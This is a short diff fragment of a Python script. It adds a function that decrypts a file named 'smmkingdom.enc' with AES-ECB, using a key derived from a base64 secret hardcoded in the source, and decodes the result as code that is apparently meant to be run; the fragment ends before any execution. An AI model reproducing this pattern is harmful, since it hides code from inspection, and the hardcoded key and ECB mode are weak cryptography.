@@ -121,13 +121,21 @@ def check_update():
 
 # ================= RUN ENCRYPTED (SANS IV) =================
 def run_encrypted():
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import unpad
+    import base64, hashlib
+
+    SECRET_B64 = "YTkxZjNjOWUwZjhjMWIyZC4uLg=="
+    KEY = hashlib.sha256(base64.b64decode(SECRET_B64)).digest()  # 32 bytes
+
     with open("smmkingdom.enc", "rb") as f:
         encrypted_b64 = f.read()
 
     encrypted = base64.b64decode(encrypted_b64)
 
     cipher = AES.new(KEY, AES.MODE_ECB)
-    decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
+
+    decrypted = unpad(cipher.decrypt(encrypted), 16)
 
     code = decrypted.decode("utf-8")
 
